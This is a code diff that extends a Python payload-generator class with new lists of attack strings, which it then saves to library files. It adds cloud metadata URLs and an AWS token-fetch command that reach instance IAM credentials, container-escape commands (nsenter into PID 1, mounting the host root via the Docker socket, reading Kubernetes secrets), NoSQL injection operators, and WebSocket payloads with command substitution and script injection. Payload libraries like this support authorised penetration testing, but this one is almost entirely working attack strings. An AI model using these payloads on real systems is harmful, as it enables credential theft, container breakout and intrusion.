@@ -87,6 +87,37 @@ class MasterPayloadGenerator:
             "user\r\n[ERROR] System compromised"
         ]
 
+    def generate_cloud_metadata(self):
+        return [
+            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
+            "http://10.254.254.254/metadata/instance?api-version=2021-02-01",
+            "TOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\") && curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/"
+        ]
+
+    def generate_container_escapes(self):
+        return [
+            "find /sys/fs/cgroup -name release_agent",
+            "nsenter --target 1 --mount --uts --ipc --net --pid /bin/bash",
+            "docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash",
+            "curl -k https://kubernetes.default/api/v1/namespaces/default/secrets/"
+        ]
+
+    def generate_nosql_injection(self):
+        return [
+            '{"$gt": ""}',
+            '{"$ne": null}',
+            '{"$where": "this.password.length > 0"}',
+            '{"$regex": ".*"}'
+        ]
+
+    def generate_websocket_fuzz(self):
+        return [
+            '{"type": "subscribe", "channel": "admin", "token": "' + 'A' * 1024 + '"}',
+            '{"command": "exec", "args": ["$(whoami)"]}',
+            '{"event": "chat", "message": "<script>alert(1)</script>"}'
+        ]
+
     def generate_all(self):
         lib = {}
         lib['unicode'] = self.generate_unicode_attacks()
@@ -100,6 +131,10 @@ class MasterPayloadGenerator:
         lib['cors'] = self.generate_cors_exploits()
         lib['oauth'] = self.generate_oauth_attacks()
         lib['log_injection'] = self.generate_log_injection()
+        lib['cloud_metadata'] = self.generate_cloud_metadata()
+        lib['container_escape'] = self.generate_container_escapes()
+        lib['nosql_injection'] = self.generate_nosql_injection()
+        lib['websocket_fuzz'] = self.generate_websocket_fuzz()
 
         # Save to library files
         for cat, payloads in lib.items():
